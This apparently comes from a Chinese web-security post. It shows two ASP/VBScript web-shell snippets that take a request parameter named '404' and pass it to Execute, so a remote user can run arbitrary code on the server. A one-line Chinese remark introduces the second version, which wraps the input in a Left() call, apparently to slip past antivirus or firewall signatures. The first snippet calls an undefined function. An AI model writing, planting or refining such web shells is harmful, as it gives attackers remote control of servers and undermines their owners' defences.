<%

Function b():
    b = request("404")

    eXecUTe(b())
End Function
f()

%>

加个left函数进去处理看看

<%
Function b()
     b = request("404")
End Function
Function f():
     x=b()
     y=Left(x,99999)
     execute(y)
End Function
f()
%>
